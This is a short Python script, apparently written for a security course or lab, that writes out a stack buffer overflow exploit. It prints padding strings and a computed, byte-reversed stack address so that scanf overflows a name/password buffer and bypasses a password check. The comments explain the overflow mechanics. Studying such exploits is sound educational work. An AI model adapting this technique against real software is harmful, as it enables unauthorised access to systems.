#!/usr/bin/python

def hexify(n):
  a = '%016x' % n
  bytes = [ a[i:i+2] for i in range(0,len(a),2) ]
  return map(lambda bs: int(bs,16), bytes)

def own(n):
  # For debugging: number the owns strings.  WARNING: this makes the
  # name and pw strings different when they might otherwise be the
  # same. Beware of Heisenbugs.

  #return 'owns:%02i\0' % n
  return 'ownz_u!\0'

def owns(a,b):
  return ''.join(map(own,range(a,b)))

def main(rbp):
  # Number of 'ownz_u!\0' strings to shift from center of name-pw
  # buffers.
  delta = 0
  name_offset = 8 + 8 + 128
  addr_bytes = hexify(rbp - name_offset + delta*8)
  # Reverse the bytes before stringifying for endianness.
  addr_str = ''.join(map(chr,reversed(addr_bytes)))

  # name
  #
  # The address string 'addr_str' is 8 bytes, so 'scanf' overflows a null
  # into the first byte of 'good'.  In practice it seems the high
  # order address bytes are always zero, so this overflow could
  # probably be avoided as in part 1.
  print (owns(16,32) + addr_str)

  # pw
  #
  # We drop the last null (with [:-1]) because scanf() writes a
  # trailing null for us.  At one point the scanf() null was
  # overflowing into the first byte of name, making name an empty
  # string :P
  #
  # We force the first string to be different from the first string in
  # 'name', so that 'match(name,pw)' will return false.
  # Alternatively, we could overflow the 'good' address, allowing
  # 'match(name,pw)' to be true. This is possible because in practice
  # the frame pointer has zero in the most significant bytes
  # (overflowing 'good', and hence the stack, causes a segfault).
  # But, by forcing the difference, the debugging and non-debugging
  # exploits work the same way.

  print ('owns:00\0' + owns(1,16)[:-1])
  #print (owns(0,16)[:-1])

if __name__ == '__main__':
  rbp = int(raw_input(), 16)
  main(rbp)
